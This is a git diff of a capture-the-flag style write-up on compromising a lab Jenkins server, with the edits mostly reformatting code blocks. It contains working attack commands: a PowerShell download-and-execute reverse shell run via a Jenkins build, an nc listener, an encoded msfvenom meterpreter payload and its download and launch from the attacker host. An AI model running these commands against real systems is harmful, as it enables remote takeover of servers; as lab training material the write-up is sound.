@@ -4,10 +4,13 @@
 ## Nmap Scan
 ```$ nmap -sV -v -oN scans/initial_scan.nmap 10.10.118.177```
 ```$ nmap -A -p- -v -oN scans/all_scan.nmap 10.10.31.121```
+
+```
 PORT     STATE SERVICE
 80/tcp   open  http
 3389/tcp open  ms-wbt-server
 8080/tcp open  http-proxy
+```
 
 
 ## Eumeration
@@ -20,13 +23,13 @@ Jenkin's projects seems to allow command execution, output is avalible to us
 ## Exploitation
 
 By configuring the premade project we can insert our own command:
-```powershell iex (New-Object Net.WebClient).DownloadString('http://$LOCAL_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $LOCAL_IP -Port 9999```
+`powershell iex (New-Object Net.WebClient).DownloadString('http://$LOCAL_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $LOCAL_IP -Port 9999`
 
 Then setup an HTTP Python server to hold the Invoke-PowerShellTcp.ps1 shell:
-```python3 -m http.server```
+`python3 -m http.server`
 
 Finally set up NC listener:
-```nc -lnvp 9999```
+`nc -lnvp 9999`
 
 Build the project, get a shell!
 
@@ -42,14 +45,14 @@ I tried using post/multi/manage/shell_to_meterpreter but it did not seem to work
 Lets generate a msfvenom payload, host it on the python server, and execute it on the victim
 
 Create shell (in web directory):
-```msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$LOCAL_IP LPORT=9998 -f exe -o mshell.exe```
+`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$LOCAL_IP LPORT=9998 -f exe -o mshell.exe`
 
 Then download it:
-```powershell "(New-Object System.Net.WebClient).Downloadfile('http://$LOCAL_IP:8000/mshell.exe','mshell.exe')"```
+`powershell "(New-Object System.Net.WebClient).Downloadfile('http://$LOCAL_IP:8000/mshell.exe','mshell.exe')"`
 
 
 Put up multi/handler on metasploit with the same payload (windows/meterpreter/reverse_tcp) and run the shell:
-```Start-Process "mshell.exe"```
+`Start-Process "mshell.exe"`
 
 Now we have a meterpreter session!
 
